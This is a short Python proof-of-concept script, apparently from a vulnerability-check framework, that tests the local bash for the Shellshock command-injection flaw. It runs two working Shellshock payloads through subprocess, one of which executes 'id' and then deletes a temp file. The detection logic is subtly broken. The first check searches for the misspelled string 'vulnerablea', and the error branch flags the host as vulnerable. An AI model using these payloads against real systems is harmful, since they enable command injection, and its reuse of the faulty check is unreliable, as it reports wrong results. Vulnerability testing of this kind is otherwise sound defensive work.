#!/usr/bin/env python
#encoding=utf-8

# __author__ test
# __time__ 2018-4-25

import subprocess
import sys

		
class  bashPoc(object):
	"""docstring for  portScanner"""
	vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
	version = '1' #默认为1
	vulDate = '2018-04-27' #漏洞公开的时间,不知道就写今天

	author = 'test' #  PoC作者的大名
	createDate = '2018-04-27'# 编写 PoC 的日期
	updateDate = '2018-04-27'# PoC 更新的时间,默认和编写时间一样
	references = []# 漏洞地址来源,0day不用写
	name = 'bash shellshock'# PoC 名称
	appPowerLink = ''# 漏洞厂商主页地址
	appName = 'bash'# 漏洞应用名称
	appVersion = '4.3之前'# 漏洞影响版本
	vulType = 'command injection'#漏洞类型,类型参考见 漏洞类型规范表
	desc = '''
		BASH除了可以将shell变量导出为环境变量，还可以将shell函数导出为环境变量！
		当前版本的bash通过以函数名作为环境变量名，以“（）{”开头的字串作为环境变量的值来将函数定义导出为环境变量。
	''' # 漏洞简要描述
	samples = []# 测试样列,就是用 PoC 测试成功的网站
	install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写



	#验证漏洞
	def verify(self):
		payload="env x='() { :;}; echo vulnerable' bash -c \"echo this is a test\""
		try:
			commandResult=subprocess.getoutput(payload)
			if ("vulnerablea" in commandResult):
				return {u"bash破壳漏洞":{"":{"describe":u"服务器存在bash破壳漏洞","tag":1,"level":u"高危","repair":u"请更新bash版本需高于4.2.46"}},"rows":1}
			else:
				payload="env -i X='() { (a)=>\\' bash -c 'testaa id '; cat testaa;rm -rf testaa"
				commandResult=subprocess.getoutput(payload)
				if("uid=" in commandResult):
					return {u"bash破壳漏洞":{"":{"describe":u"服务器存在bash破壳漏洞","tag":1,"level":u"高危","repair":u"请更新bash版本需高于4.2.46"}},"rows":1}
				else:
					return {u"bash破壳漏洞":{"":{"describe":u"服务器不存在bash破壳漏洞","tag":0,"level":u"高危","repair":u"请更新bash版本需高于4.2.46"}},"rows":1}
		except Exception as e:
			return {u"bash破壳漏洞":{"":{"describe":u"验证失败,请重新验证","tag":1,"level":u"高危","repair":u"请重新检查服务器是否存在bash破壳漏洞(联系网络安全部)"}},"rows":1}
		



a=bashPoc()
print (a.verify())
